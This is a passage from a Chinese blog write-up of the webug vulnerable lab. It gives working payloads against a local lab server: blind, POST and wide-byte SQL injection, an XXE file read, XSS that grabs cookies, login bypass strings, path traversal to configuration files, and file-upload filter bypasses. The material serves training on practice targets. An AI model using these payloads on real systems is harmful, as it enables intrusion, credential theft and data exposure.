limit 0,1)&gt;1,1,sleep(5));</p><p>left()函数<br>left(A,num)=B   A的前num位是不是B？<br>例子：<br>Select left(database(),1) &gt; ’a’ ; 判断当前数据库的第一位是否比a大<br>同理： Select left(database(),2) &gt; ’sa’ ;  此时应该已经判断出了第一位，可以用这种方法判断第二位 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 3  布尔盲注</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;mysql</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.178&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1显示正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘显示不完整，但是没有报错信息产生</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1’--+ 显示正常，根据提示，得到注入点</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ order by 2--+ 此时显示正常，说明存在两列（其实这个在本节中没有意义）</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((length(database())&gt;2),1,sleep(5))--+ 通过慢慢测试到当前的数据库名字长度为5.</span><br><span class="line"></span><br><span class="line"># 对于布尔注如来说，存在一定的缺陷：1、慢  2、不安全；故而推荐DNSlog注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((select length(schema_name) from information_schema.schemata limit 0,1)&gt;100,1,sleep(5))--+ 通过这个来查询数据库的长度，当然这个是每一个进行查询，在本节中我们查询的是当前的数据库，可以使用</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((select length(database()))&gt;2,1,sleep(5))--+这个是用来查询当前使用的数据库长度是多少的，最后知道这个数据库长度是5</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left(database(),1) &gt; ’s’--+ 使用大于号可以用来判断，但是在正式使用的时候，我们可以使用burpsuite进行辅助判断，加快速度，最快的当然是使用脚本，本次视频暂不示范。</span><br><span class="line"></span><br><span class="line">注意： http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left(database(),1) &gt; ’saaa’--+  请大家留意这个也是正确的，所以大家尽量使用一个字符来判断。</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left((select schema_name from information_schema.schemata limit 0,1),1)&gt;’a’--+  这种使用limit的方法可以遍历所得数据库</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left((select table_name from information_schema.tables where table_schema&#x3D;’webug‘ limit 0,1),1)&gt;’a’--+  遍历里面的所有表</span><br><span class="line">剩下的就是遍历列名字，然后和字段的值，这个过程较为麻烦，可以使用脚本或sqlimap</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-延时注入"><a href="#4-延时注入" class="headerlink" title="4 延时注入"></a>4 延时注入</h2><p>判断长度：</p><p>database（）</p><p>length(database()):返回数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ --+ 发现修改之后没有错误，找到注入点</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and 1&#x3D;1 --+ 再次验证我们找到注入点是正确的</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and if((length(database())&gt;1),1,sleep(5))--+ 和第二关相同的方法，判断此时的值，在使用大于和小于号的时候，适合手工判断，可以使用burpsuite配合等号进行快速长度判断。</span><br><span class="line"> </span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and if(((select length(schema_name) from information_schema.schemata limit 0,1)&gt;1),1,sleep(5))--+ 也可通过这种方法进行一个一个数据库长度的判断，不过较慢。</span><br><span class="line"> 其余方法和第二关相同。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-POST-注入"><a href="#5-POST-注入" class="headerlink" title="5 POST 注入"></a>5 POST 注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">点击注册&#x2F;登录界面没有反应，看到存在一个搜索界面，我们直接输入’，此时产生报错信息： Invalid query: SELECT * FROM sqlinjection WHERE content &#x3D; ‘‘’ 即表示此界面存在注入漏洞。</span><br><span class="line"></span><br><span class="line">使用http—leader工具抓到post数据，也可以使用burpsuite抓取数据：存在post数据：keyWordName&#x3D;‘，此时我们可以开始构造。</span><br><span class="line">我们在hackbar的post中构造： keyWordName&#x3D;‘#(这里不能使用--+，使用--+是错误的)</span><br><span class="line"></span><br><span class="line">使用order by和union select1,2# 发现在页面中并未发现回显数据，这里我们使用盲注。</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘ and  length(database())&#x3D;1# 使用盲注之后，发现页面没有发生变化，我们改为时间盲注。</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;fadsfadfdasfasdfasfd‘ and  1&#x3D;2#   和 keyWordName&#x3D;fadsfadfdasfasdfasfd’ or 1&#x3D;2#返回均正常，说明了这里不能使用and语句。 理论上来说使用and的第一个语句是错误的，但是页面返回还是正常，说明做了处理，我们继续尝试</span><br><span class="line"></span><br><span class="line">使用sleep()   ——》 keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or sleep(3)# 存在延迟， keyWordName&#x3D;fadsfadfdasfasdfasfd’ and  sleep(3)#没有延迟，接下来我们使用or来处理(注意这里是一个坑！！！)</span><br><span class="line"></span><br><span class="line"> keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or if(length(database())&gt;1,1,sleep(5))# 通过返回信息来判断当前数据库长度，和less02基本相似</span><br><span class="line"> </span><br><span class="line">keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or if(((select length(schema_name) from information_schema.schemata limit 0,1)&gt;1),1,sleep(5))# 也可通过这种遍历的方法判断所有的数据库。 速度较慢，推荐使用脚本。</span><br><span class="line"></span><br><span class="line">接下来的使用方法就是和以前相同了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-过滤注入"><a href="#6-过滤注入" class="headerlink" title="6 过滤注入"></a>6 过滤注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在搜索页面输入’ 点击搜索，发现了报错。 keyWordName&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘# 此时返回正常页面， keyWordName&#x3D;’ or sleep(3) # 存在延时</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘ or if(length(database())&gt;1,1,sleep(5))#  好像并没有进行过滤注入</span><br><span class="line"></span><br><span class="line">和第4关一样。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-宽字节"><a href="#7-宽字节" class="headerlink" title="7 宽字节"></a>7 宽字节</h2><p><strong>知识补充</strong></p><p>参考文章： <a href="https://blog.csdn.net/helloc0de/article/details/76180190">https://blog.csdn.net/helloc0de/article/details/76180190</a><br>                      <a href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a><br>宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。    中文、韩文、日文等均存在宽字节，英文默认都是一个字节。</p><p>在使用PHP连接MySQL的时候，当设置“set  character_set_client = gbk”时会导致一个<code>编码转换</code>的问题。<br>例子：   id= 1’       处理  1 \’       进行编码   1%5c%27         带入sql后  id = \’ and XXXX  此时无法完成注入<br>                id=1%df’  处理 1%df\’ 进行编码  1%df%5c%27   带入sql后  id =1運’ and XXX 此时存在宽字节注入漏洞</p><p><strong>实战</strong></p><p>常见使用：</p><p><code>&#39;</code></p><p><code>&quot;</code></p><p><code>&#39;)</code></p><p><code>&#39;))</code></p><p><code>&quot;)</code></p><p><code>&quot;))</code></p><p>因为id 的where语句是这样的;<code>where id = () / &#39;&#39; / &quot;&quot; / (&#39;&#39;)</code>这些形式的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1’ 此时返回正常，由题目知道是宽字节注入，所以直接引入%df’</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df’ 页面发生报错</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ order by 2--+ 使用order by语句，发现存在两列   这里开始就和前面的第一关一模一样了</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,2 --+ 发现2出现在页面中</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,database() --+ 查询当前的数据库为 webug_width_byte </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,group_concat(schema_name) from information_schema.schemata --+或者使用这个，一次性取出所有的数据</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x77656275675f77696474685f62797465 --+(注意：这里不能直接使用where table_name&#x3D;’ webug_width_byte ’,因为单引号被转义掉了)</span><br><span class="line"></span><br><span class="line">————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518175200031.png" alt="image-20200518175200031"></p><h1 id="2-XXE注入漏洞-XML外部实体注入-XML-External-Entity"><a href="#2-XXE注入漏洞-XML外部实体注入-XML-External-Entity" class="headerlink" title="2 XXE注入漏洞(XML外部实体注入(XML External Entity))"></a>2 XXE注入漏洞(XML外部实体注入(XML External Entity))</h1><p>参考资料： <a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a><br>                       <a href="https://blog.csdn.net/lvxiangan/article/details/80912870">https://blog.csdn.net/lvxiangan/article/details/80912870</a><br>                       <a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a><br>Xml定义： XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。</p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518220310856.png" alt="image-20200518220310856"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以将 图片中的代码进行url编码，然后借助第七关构造数据：</span><br><span class="line">data= %3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%41%4e%59%20%5b%0a%20%20%20%20%3c%21%45%4e%54%49%54%59%20%63%72%6f%77%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%43%3a%2f%70%68%70%53%74%75%64%79%2f%57%57%57%2f%2f%31%2e%74%78%74%22%3e%0a%5d%3e%0a%3c%6e%6f%74%65%3e%0a%20%20%20%20%3c%6e%61%6d%65%3e%26%63%72%6f%77%3b%3c%2f%6e%61%6d%65%3e%0a%3c%2f%6e%6f%74%65%3e%20</span><br><span class="line">这样我们就可以读取1.txt中的hello crow了</span><br><span class="line">由于不知道flag文件放在哪里，所以不再读取flag文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-CVS-漏洞"><a href="#3-CVS-漏洞" class="headerlink" title="3 CVS 漏洞"></a>3 CVS 漏洞</h1><p>参考资料： <a href="https://www.freebuf.com/vuls/195656.html">https://www.freebuf.com/vuls/195656.html</a></p><h1 id="4-XSS漏洞"><a href="#4-XSS漏洞" class="headerlink" title="4 XSS漏洞"></a>4 XSS漏洞</h1><p>xss(反射型)</p><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><p>反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。</p><p>存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。</p><p>DOM型XSS：其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。DOM型的XSS实现都在前台执行</p><p><strong>1 反射型xss</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;xss_1.php?id&#x3D;&lt;script&gt;alert(&#x2F;crow&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;xss_1.php?id&#x3D;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2 存储型xss</strong></p><p>拉倒最后的留言板：</p><script>alert(document.cookie)</script><p><strong>3 DOM型xss</strong></p><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。DOM型的XSS实现都在前台执行<br>具体讲解请自行百度！<br>首先在文本框里面随便输入，查看源代码：<br><input name="search" type="text" value="ABCDEFG" required><br>我们将其闭合：<br>“&gt;<script>alert(document.cookie)</script> 将其放在搜索框里即可！</p><p><input name="search" type="text" value><script>alert(document.cookie)</script> “ required=””&gt;</p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519115152029.png" alt="image-20200519115152029"></p><p><strong>4 过滤XSS</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 直接使用上一节使用的函数：&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;  显示请不要包含恶意函数，考虑绕过</span><br><span class="line"></span><br><span class="line">2. &lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;   首先分解： &lt;script&gt;此时显示不要包含恶意函数，使用alert(1)，正常</span><br><span class="line"></span><br><span class="line">3. 尝试将script进行大小写，发现还是不行。</span><br><span class="line"></span><br><span class="line">4. 此时我们更换标签： &lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;，此时将里面的值更换即可！</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;filter_xss.php?id&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(document.cookie)&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-万能密码"><a href="#5-万能密码" class="headerlink" title="5 万能密码"></a>5 万能密码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Sql语句： $sql &#x3D; &quot;SELECT * FROM user WHERE username &#x3D; &#39; &#39; AND password &#x3D; &#39; &#39; ;</span><br><span class="line">    常见的万能密码：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Downtime&#x2F;p&#x2F;7648182.html</span><br><span class="line">直接使用弱口令：  admin&#x2F;admin,admin&#x2F;admin888</span><br><span class="line">或者使用万能密码： ‘ or 1&#x3D;1#&#x2F;随意填写</span><br><span class="line">或者使用burpsuite尝试爆破</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="6-链接注入"><a href="#6-链接注入" class="headerlink" title="6 链接注入"></a>6 链接注入</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.136/control/xss/link_xss.php?id=1 点击页面，并未发生什么变化</span><br><span class="line">http://192.168.80.136/control/xss/link_xss.php?id=11222 在页面上找到了11222</span><br><span class="line">此时我们构造一个herf标签 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">https://www.baidu.com</span> &gt;</span>点我试试看<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7 任意文件下载"></a>7 任意文件下载</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">任意文件下载： 可参考 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhaijiahui&#x2F;p&#x2F;8459661.html</span><br><span class="line">任意文件下载：在很多提供文件下载的模块，由于缺乏对下载的文件的限制，攻击者可以通过绝对路径对其服务器内部的文件或配置文件等进行下载读取。</span><br><span class="line">漏洞一般存在于有下载功能的地方。</span><br><span class="line">我们可以配合burpsuite以及网站的报错绝对路径等信息进行尝试。</span><br><span class="line">可以使用goole或百度：</span><br><span class="line">     inurl: readfile.php?file&#x3D;</span><br><span class="line">    • download.php?path&#x3D;</span><br><span class="line">    • download.php?file&#x3D;</span><br><span class="line">    • down.php?file&#x3D;</span><br><span class="line">    • data.php?file&#x3D;</span><br><span class="line">    • readfile.php?file&#x3D;</span><br><span class="line">    • read.php?filename&#x3D;</span><br><span class="line">也可以使用字典等进行爆破的形式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;filedownload&#x2F;file_download.php?file&#x3D;template&#x2F;assets&#x2F;img&#x2F;2.txt </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;filedownload&#x2F;file_download.php?file&#x3D;template&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini 下载看一下系统版本信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519151116553.png" alt="image-20200519151116553"></p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519151303483.png" alt="image-20200519151303483"></p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519151354177.png" alt="image-20200519151354177"></p><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519151519147.png" alt="image-20200519151519147"></p><h1 id="8-MySQL配置文件下载"><a href="#8-MySQL配置文件下载" class="headerlink" title="8  MySQL配置文件下载"></a>8  MySQL配置文件下载</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;filedownload&#x2F;ini_file_download.php?file&#x3D;template&#x2F;assets&#x2F;img&#x2F;1.txt </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;filedownload&#x2F;ini_file_download.php?file&#x3D;..&#x2F;mysql&#x2F;my.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="9-文件上传漏洞"><a href="#9-文件上传漏洞" class="headerlink" title="9 文件上传漏洞"></a>9 文件上传漏洞</h1><h2 id="1-知识补充"><a href="#1-知识补充" class="headerlink" title="1 知识补充"></a>1 知识补充</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</span><br><span class="line"></span><br><span class="line">参考： https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;5ebba0482980</span><br><span class="line">靶场：upload-labs  https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs  后期也会录制专门的视频进行讲解</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-前端拦截"><a href="#2-前端拦截" class="headerlink" title="2 前端拦截"></a>2 前端拦截</h2><ul><li><p>法一： 修改为1.jpg，使用burpsuite进行修改为1.php</p></li><li><p>法二：直接修改前端代码或者禁用js</p><ul><li><p>​    火狐中输入：<code> about:config</code>  搜索： <code>javascript</code>  将j<code>avascript.enabled</code>的类型改为<code>false  </code>用完之后记得改回来</p></li><li><p>​    将文件名称改为xx.php.jpg  使用burpsuite进行拦截改包</p><p>我们制作一个phpinfo()页面</p></li></ul></li></ul><h2 id="3-解析漏洞"><a href="#3-解析漏洞" class="headerlink" title="3  解析漏洞"></a>3  解析漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在这一关中，既然是文件上传的解析漏洞，那么我们就想着使用畸形解析漏洞等：</span><br><span class="line">大小写   Php</span><br><span class="line">后缀名   php3  php5 </span><br><span class="line">%00 </span><br><span class="line">::$DATA  这些都是不可成功的！！！</span><br><span class="line">解决方法： 查询生僻字                 龘（dá）  crow.php龘.jpg直接上传即可！！！</span><br></pre></td></tr></table></figure><h2 id="4-畸形文件"><a href="#4-畸形文件" class="headerlink" title="4 畸形文件"></a>4 畸形文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 只能传图片</span><br><span class="line">2. 直接上传crow.php.jpg   然后在burpsuite中修改掉.jpg   查看返回信息 C:&#x2F;phpStudy&#x2F;WWW&#x2F;template&#x2F;upload&#x2F;1569851084  此时文件被处理</span><br><span class="line">我们尝试双写  </span><br><span class="line">crow.pphphp返回正常的值</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-截断上传"><a href="#5-截断上传" class="headerlink" title="5 截断上传"></a>5 截断上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法与less-18关相同，注意：我在使用汉字的时候上传可能不一样，或者无法进行解析为php，所以我们选择生僻字               </span><br><span class="line">C:&#x2F;phpStudy&#x2F;WWW&#x2F;template&#x2F;upload&#x2F;crow.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-htaccess文件"><a href="#6-htaccess文件" class="headerlink" title="6     htaccess文件"></a>6     htaccess文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以通过htaccess文件实现301重定向、自定义404页面、修改文件拓展名等功能。</span><br><span class="line">参考文件：https:&#x2F;&#x2F;blog.csdn.net&#x2F;cmzhuang&#x2F;article&#x2F;details&#x2F;53537591</span><br><span class="line">SetHandler application&#x2F;x-httpd-php  这行代码的意思是将所有文件解析为php文件</span><br><span class="line"></span><br><span class="line">因为原作者写的代码可能有些问题，所以直接使用我们自己的</span><br><span class="line">在附件中</span><br><span class="line">地址：C:\phpStudy\WWW\control\upload_file\upload_file_5.php，并且要将php版本修改为5.2.17</span><br><span class="line">1. 首先上传.htaccess文件</span><br><span class="line">2.上传任意文件结尾文件即可！</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="10-越权修改密码"><a href="#10-越权修改密码" class="headerlink" title="10 越权修改密码"></a>10 越权修改密码</h1><p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519170444065.png" alt="image-20200519170444065"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line">1. 使用admin&#x2F;admin或者admin&#x2F;admin888、admin&#x2F;123456等作为弱口令进行暴力尝试登陆后修改密码</span><br><span class="line">法二：</span><br><span class="line">2. 使用万能密码进行暴力破解登陆后修改密码 </span><br><span class="line">‘ or 1&#x3D;1# &#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="11-支付漏洞"><a href="#11-支付漏洞" class="headerlink" title="11 支付漏洞"></a>11 支付漏洞</h1><figure class="highlight plain"><table><tr><td 